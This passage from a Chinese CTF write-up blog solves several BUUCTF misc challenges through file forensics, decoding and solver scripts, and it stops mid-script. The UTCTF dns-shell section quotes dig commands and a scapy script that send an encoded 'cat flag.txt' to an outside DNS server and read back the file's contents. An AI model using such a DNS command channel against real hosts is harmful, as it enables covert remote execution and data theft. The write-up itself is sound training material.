class="line">flag&#123;41322239&#125; </span><br></pre></td></tr></table></figure><h2 id="GWCTF2019-math"><a href="#GWCTF2019-math" class="headerlink" title="[GWCTF2019]math"></a>[GWCTF2019]math</h2><p>远程连上去可以看到，是一个计算公式，需要答对150题目，并且有很少的时间</p><p><img src="/image/media/2022/ctf/buu/7/11.png"></p><p>直接写个EXP自动答题</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">content = 1</span><br><span class="line">def main():</span><br><span class="line">    sh = remote(&quot;node4.buuoj.cn&quot;, 25432)</span><br><span class="line">    for i in range(150):</span><br><span class="line">        print(i)</span><br><span class="line">        res =sh.recvuntil(&#x27;Math problem: &#x27;)</span><br><span class="line">        res = sh.recvuntil(&#x27; =&#x27;)</span><br><span class="line">        print(res)</span><br><span class="line">        # print((res.decode(encoding=&#x27;UTF-8&#x27;)))#转换一下编码格式</span><br><span class="line">        num=eval(res.decode(encoding=&#x27;UTF-8&#x27;)[:-1])</span><br><span class="line">        print(num)</span><br><span class="line">        sh.sendline(str(num))</span><br><span class="line">    sh.interactive()</span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;3e0966bd-64fc-41da-a75f-ebd651663184&#125;</span><br></pre></td></tr></table></figure><h2 id="BSidesSF2019-bWF0cnlvc2hrYQ"><a href="#BSidesSF2019-bWF0cnlvc2hrYQ" class="headerlink" title="[BSidesSF2019]bWF0cnlvc2hrYQ=="></a>[BSidesSF2019]bWF0cnlvc2hrYQ==</h2><p>用010打开附件能够看到Face的内容是，下面的内容通过base64解码得到二维码识别为：h4ck_the_plan3t</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iVBORw0KGgoAAAANSUhEUgAAADAAAAAwAQMAAABtzGvEAAAABlBMVEX///8AAABVwtN+AAAACXBIWXMAAAsTAAALEwEAmpwYAAAAB3RJTUUH4wMBBAIZ8ky8pwAAAJRJREFUGFdlzbEJwzAQBdAzB04TkhE0gzqrkVYRZIEMIHAgawiyyqWJS69g8AhqXIT8FPERI1evfAQ0GaAV4ZCFK4bS5HH+49OWNu4Q7pKwArjf4DJARG0kUlAWY3PFcsUcoLjyMhSV5ShsJ8XhMHuuIAr3z0UBfP/MijD1FspQOiNmh6cTbUjNTRF2j/NUAfg4vle+pY6V5XCWRiUAAAAASUVORK5CYII=</span><br></pre></td></tr></table></figure><p>可以看到有几个文件私钥文件Matry_Oshka.key和加密文件hack.pgp，但是通过base64加密了，可以用下面这个软件解密</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># #base64写成文件</span><br><span class="line">import  base64</span><br><span class="line">with open(&quot;secret.txt&quot;, &quot;r&quot;) as f:</span><br><span class="line">    imgdata = base64.b64decode(f.read())</span><br><span class="line">    #imgdata = str(f.read())</span><br><span class="line">    file = open(&#x27;zip.key&#x27;, &#x27;wb&#x27;)</span><br><span class="line">    file.write(imgdata)</span><br><span class="line">    file.close()</span><br></pre></td></tr></table></figure><p>PGPTool来解密，PGPTool: <a href="https://pgptool.github.io/">https://pgptool.github.io/</a></p><p>首先导入Key ring-&gt;Import PGP Key-&gt;导入Matry_Oshka.key</p><p><img src="/image/media/2022/ctf/buu/7/12.png"></p><p>导入之后选择import即可看到弹窗看到具体信息，然后选择Decrypt file中选择hack.pgp</p><p><img src="/image/media/2022/ctf/buu/7/13.png"></p><p>这里需要输入前面得到的密码：h4ck_the_plan3t得到一个zip，并且需要找到路径</p><p><img src="/image/media/2022/ctf/buu/7/14.png"></p><p>打开zip，里面是一个file.bin文件没有加密直接解压，得到一个用foremost识别的结果是lzip，然后删除文件头LZIP前面的内容另存为</p><p>然后用lzip -d file.bin解压得到file.bin.out，file一下是一个pdf文件，然后得到一个png图片</p><p><a href="https://upload.wikimedia.org/wikipedia/en/2/27/Bliss_%28Windows_XP%29.png%E5%8E%9F%E5%9B%BE%E8%BF%9B%E8%A1%8Csub%E6%93%8D%E4%BD%9C%E5%BE%97%E5%88%B0%E4%B8%80%E4%B8%AA%E4%BA%8C%E7%BB%B4%E7%A0%81">https://upload.wikimedia.org/wikipedia/en/2/27/Bliss_%28Windows_XP%29.png原图进行sub操作得到一个二维码</a></p><p><img src="/image/media/2022/ctf/buu/7/15.png"></p><p>识别得到，看起来是base64但是通过有一个减号，改成+号，然后解密得到一个7z压缩包</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/Td6WFoAAATm1rRGAgAhARwAAAAQz1jM4ELCAORdABhgwwZfNTLh1bKR4pwkkcJw0DSEZd2BcWATAJkrMgnKT8nBgYQaCPtrzORiOeUVq7DDoe9feCLt9PG-MT9ZCLwmtpdfvW0n17pie8v0h7RS4dO/yb7JHn7sFqYYnDWZere/6BI3AiyraCtQ6qZmYZnHemfLVXmCXHan5fN6IiJL7uJdoJBZC3Rb1hiH1MdlFQ/1uOwaoglBdswAGo99HbOhsSFS5gGqo6WQ2dzK3E7NcYP2YIQxS9BGibr4Qulc6e5CaCHAZ4pAhfLVTYoN5R7l/cWvU3mLOSPUkELK6StPUBd0AABBU17Cf970JQABgALDhQEApzo4PbHEZ/sCAAAAAARZWg==</span><br></pre></td></tr></table></figure><p><img src="/image/media/2022/ctf/buu/7/16.png"></p><p>然后用前面那个脚本转换一下得到7z压缩包，然后得到大量01组成的文件，CyberChef</p><p><img src="/image/media/2022/ctf/buu/7/17.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CTF&#123;delat_iz_muhi_slona&#125;</span><br></pre></td></tr></table></figure><h2 id="INSHack2018-GCorp-Stage-1"><a href="#INSHack2018-GCorp-Stage-1" class="headerlink" title="[INSHack2018]GCorp - Stage 1"></a>[INSHack2018]GCorp - Stage 1</h2><p>得到一个流量包，追踪TCP流在最后得到</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SU5TQXtjMTgwN2EwYjZkNzcxMzI3NGQ3YmYzYzY0Nzc1NjJhYzQ3NTcwZTQ1MmY3N2I3ZDIwMmI4MWUxNDkxNzJkNmE3fQ==</span><br></pre></td></tr></table></figure><p>经过base64解密得flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">INSA&#123;c1807a0b6d7713274d7bf3c6477562ac47570e452f77b7d202b81e149172d6a7&#125;</span><br></pre></td></tr></table></figure><h2 id="b01lers2020-minecraft-purdue"><a href="#b01lers2020-minecraft-purdue" class="headerlink" title="[b01lers2020]minecraft_purdue"></a>[b01lers2020]minecraft_purdue</h2><p>玩游戏找flag，<a href="https://www.bilibili.com/video/av843171515/%E5%8F%82%E8%80%83%E5%A4%A7%E4%BD%AC%E7%9A%84WP">https://www.bilibili.com/video/av843171515/参考大佬的WP</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;M1NE&#125;</span><br></pre></td></tr></table></figure><h2 id="NPUCTF2020-HappyCheckInVerification"><a href="#NPUCTF2020-HappyCheckInVerification" class="headerlink" title="[NPUCTF2020]HappyCheckInVerification"></a>[NPUCTF2020]HappyCheckInVerification</h2><p>得到一个破损的二维码跟mp4视频，通过手动的方式修复二维码</p><p><img src="/image/media/2022/ctf/buu/7/18.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;this_is_not_flag&#125;</span><br><span class="line">三曳所諳陀怯耶南夜缽得醯怯勝數不知喝盧瑟侄盡遠故隸怯薩不娑羯涅冥伊盧耶諳提度奢道盧冥以朋罰所即栗諳蒙集皤夷夜集諳利顛呐寫無怯依奢竟#￥#%E68BBFE4BD9BE68B89E6A0BCE79A84E5A7BFE58ABFE59CA8E69C80E5908E32333333||254333254242254338254342254231254338254345254432254238254643254236254145254239254441254437254234254232254131254236254245253244253244254343254438254330254341254336254435...sadwq#asdsadasf faf$use$dasdasdafafa_$ba##se64$</span><br></pre></td></tr></table></figure><p>得到假的flag，中间汉字用与佛论禅解密得到：说了这不是佛拉格，你还来转？给爷爪巴</p><p><img src="/image/media/2022/ctf/buu/7/19.png"></p><p><code>然后通过||分隔符得到base16解密内容</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">E68BBFE4BD9BE68B89E6A0BCE79A84E5A7BFE58ABFE59CA8E69C80E5908E32333333</span><br><span class="line">拿佛拉格的姿势在最后2333</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">254333254242254338254342254231254338254345254432254238254643254236254145254239254441254437254234254232254131254236254245253244253244254343254438254330254341254336254435</span><br><span class="line">%C3%BB%C8%CB%B1%C8%CE%D2%B8%FC%B6%AE%B9%DA%D7%B4%B2%A1%B6%BE%2D%2D%CC%D8%C0%CA%C6%D5</span><br><span class="line">需要选择gb2312的格式：没人比我更懂冠状病毒--特朗普</span><br></pre></td></tr></table></figure><p>还有后面一部分的use base64，看大哥们的WP得到一个SSTV，<a href="/image/media/2022/ctf/buu/7/%E9%AB%98%E6%B8%85%E9%87%8D%E7%BD%AE.m4a">SSTV.mp3</a>手机上用Robot36识别出来一张图，得到flag</p><p><img src="/image/media/2022/ctf/buu/7/20.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;miSc_ChecK_In_Ver16ied&#125;</span><br></pre></td></tr></table></figure><h2 id="UTCTF2020-dns-shell"><a href="#UTCTF2020-dns-shell" class="headerlink" title="[UTCTF2020]dns-shell"></a>[UTCTF2020]dns-shell</h2><p>根据题目名称，找到流量包中的dns流量进去查看到有base64加密的东西</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bHMgLWxhCg==</span><br><span class="line">dG90YWwgMjUxMgpkcnd4ci14ci14ICAgIDEgcm9vdCAgICAgcm9vdCAgICAgICAgICA0MDk2IE1hciAgNiAwNDo0NCAuCmRyd3hyLXhyLXggICAgMSByb290ICAgICByb290ICAgICAgICAgIDQwOTYgTWFyICA2IDA4OjA5IC4uCi1ydy1yLS1yLS0gICAgMSByb290ICAgICByb290ICAgICAgICAgMTIyODggTWFyICA2IDA0OjQyIC5NYWtlZmlsZS5zd3AKLXJ3LXItLXItLSAgICAxIHJvb3QgICAgIHJvb3QgICAgICAgICAgIDEwNCBNYXIgIDUgMjM6NTAgRG9ja2VyZmlsZQotcnctci0tci0tICAgIDEgcm9vdCAgICAgcm9vdCAgICAgICAgICAgMTE5IE1hciAgNSAyMzo1MCBNYWtlZmlsZQotcnctci0tci0tICAgIDEgcm9vdCAgICAgcm9vdCAgICAgICAgICAgIDI4IE1hciAgNSAyMzo1MCBmbGFnLnR4dAotcnd4ci14ci14ICAgIDEgcm9vdCAgICAgcm9vdCAgICAgICAyNTMzODIzIE1hciAgNiAwNDo0NCBzZXJ2ZXIKLXJ3LXItLXItLSAgICAxIHJvb3QgICAgIHJvb3QgICAgICAgICAgMTY5MyBNYXIgIDUgMjM6NTAgc2VydmVyLmdv</span><br></pre></td></tr></table></figure><p>解密之后</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">ls -la</span><br><span class="line"></span><br><span class="line">total 2512</span><br><span class="line">drwxr-xr-x    1 root     root          4096 Mar  6 04:44 .</span><br><span class="line">drwxr-xr-x    1 root     root          4096 Mar  6 08:09 ..</span><br><span class="line">-rw-r--r--    1 root     root         12288 Mar  6 04:42 .Makefile.swp</span><br><span class="line">-rw-r--r--    1 root     root           104 Mar  5 23:50 Dockerfile</span><br><span class="line">-rw-r--r--    1 root     root           119 Mar  5 23:50 Makefile</span><br><span class="line">-rw-r--r--    1 root     root            28 Mar  5 23:50 flag.txt</span><br><span class="line">-rwxr-xr-x    1 root     root       2533823 Mar  6 04:44 server</span><br><span class="line">-rw-r--r--    1 root     root          1693 Mar  5 23:50 server.go</span><br></pre></td></tr></table></figure><p>然后看WP才知道环境关了<a href="https://meowmeowxw.gitlab.io/ctf/utctf-2020-do-not-stop/">https://meowmeowxw.gitlab.io/ctf/utctf-2020-do-not-stop/</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">$ dig -t TXT -q dns.google.com @35.225.16.21</span><br><span class="line">; &lt;&lt;&gt;&gt; DiG 9.16.0 &lt;&lt;&gt;&gt; -t TXT -q dns.google.com @35.225.16.21</span><br><span class="line">;; global options: +cmd</span><br><span class="line">;; Got answer:</span><br><span class="line">;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: NOERROR, id: 47829</span><br><span class="line">;; flags: qr rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 0</span><br><span class="line"></span><br><span class="line">;; QUESTION SECTION:</span><br><span class="line">;dns.google.com.INTXT</span><br><span class="line"></span><br><span class="line">;; ANSWER SECTION:</span><br><span class="line">dns.google.com.4919INA3.88.57.227</span><br><span class="line"></span><br><span class="line">;; Query time: 186 msec</span><br><span class="line">;; SERVER: 35.225.16.21#53(35.225.16.21)</span><br><span class="line">;; WHEN: Mon Mar 09 17:52:17 CET 2020</span><br><span class="line">;; MSG SIZE  rcvd: 48</span><br></pre></td></tr></table></figure><p>我们得到了一个新地址：3.88.57.227，让我们尝试使用dig新地址：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">$ dig -t TXT -q $(echo &quot;cat flag.txt&quot; | base64) @3.88.57.227</span><br><span class="line">; &lt;&lt;&gt;&gt; DiG 9.16.0 &lt;&lt;&gt;&gt; -t TXT -q Y2F0IGZsYWcudHh0Cg== @3.88.57.227</span><br><span class="line">;; global options: +cmd</span><br><span class="line">;; Got answer:</span><br><span class="line">;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: NOERROR, id: 56905</span><br><span class="line">;; flags: qr rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 0</span><br><span class="line"></span><br><span class="line">;; QUESTION SECTION:</span><br><span class="line">;Y2F0IGZsYWcudHh0Cg==.INTXT</span><br><span class="line"></span><br><span class="line">;; ANSWER SECTION:</span><br><span class="line">Y2F0IGZsYWcudHh0Cg==.4919INTXT&quot;dXRmbGFneyRhbDF5X3MzTDFTX3NFNF9kTiR9&quot;</span><br><span class="line"></span><br><span class="line">;; Query time: 196 msec</span><br><span class="line">;; SERVER: 3.88.57.227#53(3.88.57.227)</span><br><span class="line">;; WHEN: Mon Mar 09 17:53:55 CET 2020</span><br><span class="line">;; MSG SIZE  rcvd: 87</span><br></pre></td></tr></table></figure><p>附上大哥的脚本</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python3</span><br><span class="line"></span><br><span class="line">from scapy.all import *</span><br><span class="line">import base64</span><br><span class="line">packets = rdpcap(&quot;./capture.pcap&quot;)</span><br><span class="line">dns_google = packets[20]</span><br><span class="line">dns_query = packets[42]</span><br><span class="line"></span><br><span class="line">sender = IP()/UDP()/DNS()</span><br><span class="line">sender[DNS] = dns_google[DNS]</span><br><span class="line">sender[IP].dst = dns_google[IP].dst</span><br><span class="line">rec = sr1(sender)</span><br><span class="line">dns_server = rec[DNS].an.rdata</span><br><span class="line"></span><br><span class="line">sender = IP(dst=dns_server)/UDP()/DNS()</span><br><span class="line">sender[DNS] = dns_query[DNS]</span><br><span class="line">sender[DNS].qd.qname = base64.b64encode(b&#x27;cat flag.txt&#x27;).decode()</span><br><span class="line">rec = sr1(sender)</span><br><span class="line">flag = rec[DNS].an.rdata</span><br><span class="line">print(base64.b64decode(flag[0]))</span><br></pre></td></tr></table></figure><p>得到的dXRmbGFneyRhbDF5X3MzTDFTX3NFNF9kTiR9用base64解密得到flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">utflag&#123;$al1y_s3L1S_sE4_dN$&#125;</span><br></pre></td></tr></table></figure><h2 id="RoarCTF2019-davinci-cipher"><a href="#RoarCTF2019-davinci-cipher" class="headerlink" title="[RoarCTF2019]davinci_cipher"></a>[RoarCTF2019]davinci_cipher</h2><p>得到一个流量包和flag.txt类容发现规律，U+1F643这种样子是表情</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">U+1F643U+1F4B5U+1F33FU+1F3A4U+1F6AAU+1F30FU+1F40EU+1F94BU+1F6ABU+1F606U+1F383U+1F993U+2709U+1F33FU+1F4C2U+2603U+1F449U+1F6E9U+2705U+1F385U+2328U+1F30FU+1F6E9U+1F6A8U+1F923U+1F4A7U+1F383U+1F34DU+1F601U+2139U+1F4C2U+1F6ABU+1F463U+1F600U+1F463U+1F643U+1F3A4U+2328U+1F601U+1F923U+1F3A4U+1F579U+1F451U+1F6AAU+1F374U+1F579U+1F607U+1F374U+1F40EU+2705U+2709U+1F30FU+23E9U+1F40DU+1F6A8U+2600U+1F607U+1F3F9U+1F441U+1F463U+2709U+1F30AU+1F6A8U+2716</span><br></pre></td></tr></table></figure><p><img src="/image/media/2022/ctf/buu/7/21.png"></p><p>用网站<a href="https://r12a.github.io/app-conversion/%E8%A7%A3%E5%AF%86%E5%BE%97%E5%88%B0%E7%8C%9C%E6%B5%8B%E5%8F%AF%E8%83%BD%E6%98%AFemoji%E8%A7%A3%E5%AF%86">https://r12a.github.io/app-conversion/解密得到猜测可能是emoji解密</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">🙃💵🌿🎤🚪🌏🐎🥋🚫😆🎃🦓✉🌿📂☃👉🛩✅🎅⌨🌏🛩🚨🤣💧🎃🍍😁ℹ📂🚫👣😀👣🙃🎤⌨😁🤣🎤🕹👑🚪🍴🕹😇🍴🐎✅✉🌏⏩🐍🚨☀😇🏹👁👣✉🌊🚨✖</span><br></pre></td></tr></table></figure><p>在流量包中发现USB流量过滤并保存下来</p><p>全部筛选条件 (usb.src == “1.9.1”) &amp;&amp; (frame.len == 54) 并导出筛选后的分组test.pcapng</p><p>用命令提取所有的USB流量（建议使用普通用户操作tshark）可以看到一些信息</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tshark -r &#x27;test.pcapng&#x27; -T fields -e usb.capdata &gt; test.txt</span><br></pre></td></tr></table></figure><p>查看test.txt中的信息</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">10:40:2a:46:00:1e:3c:00:00:00:00:00:00:00:00:00:3f:00:00:00:00:00:00:00:00:00:00</span><br><span class="line">10:40:20:46:00:0b:3c:00:00:00:00:00:00:00:00:00:3f:00:00:00:00:00:00:00:00:00:00</span><br><span class="line">10:40:25:46:00:19:3c:00:00:00:00:00:00:00:00:00:3f:00:00:00:00:00:00:00:00:00:00</span><br><span class="line">10:40:34:46:00:05:3a:00:00:00:00:00:00:00:00:00:3f:00:00:00:00:00:00:00:00:00:00</span><br><span class="line">10:40:1c:46:00:0e:3a:00:00:00:00:00:00:00:00:00:3f:00:00:00:00:00:00:00:00:00:00</span><br><span class="line">10:40:21:46:00:a9:3b:00:00:00:00:00:00:00:00:00:3f:00:00:00:00:00:00:00:00:00:00</span><br><span class="line">10:40:24:46:00:c8:39:00:00:00:00:00:00:00:00:00:3f:00:00:00:00:00:00:00:00:00:00</span><br></pre></td></tr></table></figure><p>然后根据数位板的流量规律得到一下脚本</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"># coding:utf-8</span><br><span class="line">import matplotlib.pyplot as plt</span><br><span class="line">mousePositionX = 0</span><br><span class="line">mousePositionY = 0</span><br><span class="line">X = []</span><br><span class="line">Y = []</span><br><span class="line">DataFileName = &quot;test.txt&quot;</span><br><span class="line">data = []</span><br><span class="line">def main():</span><br><span class="line">    global mousePositionX</span><br><span class="line">    global mousePositionY</span><br><span class="line">    with open(DataFileName, &quot;rb&quot;) as f:</span><br><span class="line">        flag = 1</span><br><span class="line">        for line in f:</span><br><span class="line">            line=line.decode()</span><br><span class="line">            if line[24:26] != &quot;00&quot;:  # 根据压力值筛选，使画图结果更精准</span><br><span class="line">                print(line)</span><br><span class="line">                data.append(line[0:-1])</span><br><span class="line">    for line in data:</span><br><span class="line">        x0 = int(line[6:8], 16)</span><br><span class="line">        x1 = int(line[9:11], 16)</span><br><span class="line">        x = x0 + x1 * 256</span><br><span class="line">        y0 = int(line[15:17], 16)</span><br><span class="line">        y1 = int(line[18:20], 16)</span><br><span class="line">        y = y0 + y1 * 256</span><br><span class="line">        X.append(x)</span><br><span class="line">        Y.append(-y)</span><br><span class="line">    fig = plt.figure()</span><br><span class="line">    ax1 = fig.add_subplot(111)</span><br><span class="line">    ax1.set_title(&#x27;[%s]&#x27; % (&#x27;pcapFilePath&#x27;))</span><br><span class="line">    ax1.scatter(X, Y, c=&#x27;r&#x27;, marker=&#x27;o&#x27;)</span><br><span class="line">    plt.savefig(&quot;out.png&quot;)</span><br><span class="line">    plt.show()</span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>生成图片，得到： MONA_LISA_IS_A_MAN</p><p><img src="/image/media/2022/ctf/buu/7/out.png"></p><p>结合前面的emoji和此处的key在<a href="https://aghorler.github.io/emoji-aes/%E8%83%BD%E8%BF%9B%E8%A1%8C%E8%A7%A3%E5%AF%86%E5%BE%97%E5%88%B0flag">https://aghorler.github.io/emoji-aes/能进行解密得到flag</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">RoarCTF&#123;wm-m0de3n_dav1chi&#125;</span><br></pre></td></tr></table></figure><h2 id="RoarCTF2019-TankGame"><a href="#RoarCTF2019-TankGame" class="headerlink" title="[RoarCTF2019]TankGame"></a>[RoarCTF2019]TankGame</h2><p>直接string得到一个假的flag：RoarCTF{wm-f1@g_1$_N0t_h3r3}</p><p>dnsp打开找到，关键代码在MapManager类中的WinGame方法</p><p><img src="/image/media/2022/ctf/buu/7/22.png"></p><p>看大佬的wp，逆向爆破一下python2的脚本</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">import hashlib</span><br><span class="line">data = [[8, 8, 8, 8, 8, 8, 8, 8, 8, 8, 8, 8, 8, 8, 8, 8, 8],</span><br><span class="line">    [8, 8, 4, 5, 8, 1, 1, 1, 1, 1, 1, 8, 8, 8, 8, 4, 8],</span><br><span class="line">    [8, 2, 8, 1, 8, 8, 5, 1, 8, 8, 8, 1, 8, 1, 8, 4, 8],</span><br><span class="line">    [8, 5, 8, 2, 8, 8, 8, 8, 1, 8, 8, 4, 8, 1, 1, 5, 8],</span><br><span class="line">    [8, 8, 8, 8, 2, 4, 8, 1, 1, 8, 8, 1, 8, 5, 1, 5, 8],</span><br><span class="line">    [8, 8, 8, 8, 5, 8, 8, 1, 5, 1, 8, 8, 8, 1, 8, 8, 8],</span><br><span class="line">    [8, 8, 8, 1, 8, 8, 8, 8, 8, 8, 8, 8, 1, 8, 1, 5, 8],</span><br><span class="line">    [8, 1, 8, 8, 1, 8, 8, 1, 1, 4, 8, 8, 8, 8, 8, 1, 8],</span><br><span class="line">    [8, 4, 1, 8, 8, 5, 1, 8, 8, 8, 8, 8, 4, 2, 8, 8, 8],</span><br><span class="line">    [1, 1, 8, 5, 8, 2, 8, 5, 1, 4, 8, 8, 8, 1, 5, 1, 8],</span><br><span class="line">    [9, 1, 4, 8, 8, 8, 8, 8, 8, 8, 8, 8, 8, 8, 8, 8, 8],</span><br><span class="line">    [1, 1, 8, 1, 8, 8, 2, 1, 8, 8, 5, 2, 1, 8, 8, 8, 8],</span><br><span class="line">    [8, 8, 8, 8, 4, 8, 8, 2, 1, 1, 8, 2, 1, 8, 1, 8, 8],</span><br><span class="line">    [8, 1, 1, 8, 8, 4, 4, 1, 8, 4, 2, 4, 8, 4, 8, 8, 8],</span><br><span class="line">    [8, 4, 8, 8, 1, 2, 8, 8, 8, 8, 1, 8, 8, 1, 8, 1, 8],</span><br><span class="line">    [8, 1, 1, 5, 8, 8, 8, 8, 8, 8, 8, 8, 1, 8, 8, 8, 8],</span><br><span class="line">    [8, 8, 1, 1, 5, 2, 8, 8, 8, 8, 8, 8, 8, 8, 2, 8, 8],</span><br><span class="line">    [8, 8, 4, 8, 1, 8, 2, 8, 1, 5, 8, 8, 4, 8, 8, 8, 8],</span><br><span class="line">    [8, 8, 2, 8, 1, 8, 8, 1, 8, 8, 1, 8, 2, 2, 5, 8, 8],</span><br><span class="line">    [8, 2, 1, 8, 8, 8, 8, 2, 8, 4, 5, 8, 1, 1, 2, 5, 8],</span><br><span class="line">    [8, 8, 8, 8, 8, 8, 8, 8, 8, 8, 8, 8, 8, 8, 8, 8, 8]]</span><br><span class="line">text = &#x27;&#x27;</span><br><span class="line">for i in range(21):</span><br><span class="line">    for j in 